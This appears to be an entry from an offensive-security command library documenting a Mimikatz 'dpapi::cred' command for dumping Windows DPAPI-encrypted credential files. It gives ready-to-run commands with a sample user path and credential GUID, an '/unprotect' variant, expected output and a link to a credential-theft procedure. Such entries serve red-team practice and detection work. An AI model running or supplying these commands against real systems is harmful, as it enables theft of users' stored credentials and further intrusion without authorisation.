---
id: ef591aea-06e8-42b1-869a-5531605889e1
name: mimikatz-dpapi-cred-dump-without-masterkey
type: command
executor: cmd
data: >-
  mimikatz.exe "dpapi::cred
  /in:C:\Users\$_USERNAME\AppData\Local\Microsoft\Credentials\$_CREDENTIAL_FILE"
  exit
output: null
created_at: '2023-04-06T03:56:27.473499+00:00'
updated_at: '2023-04-10T20:37:18.798330+00:00'
platforms:
  - Windows
tags:
  - credential-dumping
  - dpapi
verified: true
validated: true
---

# mimikatz-dpapi-cred-dump-without-masterkey

## Command

```cmd
mimikatz.exe "dpapi::cred /in:C:\Users\$_USERNAME\AppData\Local\Microsoft\Credentials\$_CREDENTIAL_FILE" exit
```

## Description

Attempts to dump an encrypted credential file using Mimikatz's DPAPI module without providing a master key, typically resulting in an error but displaying the encrypted blob for analysis.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_USERNAME | Target username | Yes |
| $_CREDENTIAL_FILE | GUID of the credential file (e.g., '2647629F5AA74CD934ECD2F88D64ECD0') | Yes |
| /in | Input file path | Built-in |

## Examples

### Basic Usage

```cmd
mimikatz.exe "dpapi::cred /in:C:\Users\john.doe\AppData\Local\Microsoft\Credentials\2647629F5AA74CD934ECD2F88D64ECD0" exit
```

### Advanced Usage

```cmd
mimikatz.exe "dpapi::cred /in:"C:\path\to\file" /unprotect" exit
```

## Expected Output

```
ERROR kuhl_m_dpapi_cred_decrypt ; No masterkey available
  blob (hex)       : 01000000d08c9ddf0115d1118c7a00c00...
```

## Related

- [[procedures/Credential-Theft-with-Mimikatz-and-DPAPI]]
- [[tools/Mimikatz]]
